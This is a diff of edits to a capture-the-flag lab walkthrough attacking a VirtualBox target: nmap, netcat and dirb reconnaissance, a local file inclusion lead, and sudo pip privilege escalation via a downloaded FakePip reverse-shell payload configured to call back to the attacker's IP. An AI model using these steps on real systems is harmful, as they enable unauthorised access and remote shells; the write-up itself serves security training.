@@ -24,7 +24,7 @@ MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
 ```
 
 The target contain a web server on port 80.
-Tcp with Version, and OS version.
+Now, a scan `tcp` with `Version`.
 
     $ sudo nmap -sT -sV -A -p- 192.168.2.217
 
@@ -52,13 +52,13 @@ A try with netcat:
     $ nc 192.168.2.217 3333
     SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4
 
-We have the version of ssh, debian
+We found the version of ssh and debian.
 
 A scan with dirb:
 
     $ dirb http://192.168.2.217 /usr/share/dict/dirb-wordlists/common.txt 
 
-```sh
+```txt
 ---- Scanning URL: http://192.168.2.217/ ----
 + http://192.168.2.217/backup (CODE:200|SIZE:0)
 + http://192.168.2.217/index.php (CODE:200|SIZE:1527)
@@ -69,7 +69,7 @@ A scan with dirb:
 
 No formular, pages `/backup`, `/secret`, `/shell` are void... `/server-status` need permission... ???
 
-The source code of `/index.php` include a line who point on a `/?lang=fr` parameter...
+The source code of `/index.php` include a comment who point on a `/?lang=fr` parameter. At bottom, we found the name `mamadou`.
 
 This param is vulnerable to a Local File Inclusion (LFI), according this post on [medium.com](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) or [securityidiots.com](http://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html) , i've try many things here.  
 
@@ -173,7 +173,7 @@ Devops can execute `/usr/bin/pip` without password...
 
 Unfortunately, we can't write on this file to execute a reverse shell.
 
-After googling sometimes, we can use `fakepip`.  
+After googling thoroughly, we can use `fakepip`.  
 Download the file from [fakepip](wget https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py)
 
     $ wget -cv https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py
@@ -184,7 +184,7 @@ Edit this file to change the `RHOST` and `lport`.
 RHOST = '192.168.2.111'  # change this
 lport = 3333
 ```
-Next, we need a find a way to upload our payload by create a simple server, simply with python, you can use darkhttpd too or other thing:
+Next, we need a find a way to upload our payload. We create a simple server with python, you can use `darkhttpd`, `ngrok` too or upload the file at `https://transfer.sh`.
 
     $ python2.7 -m SimpleHTTPServer 4444
 
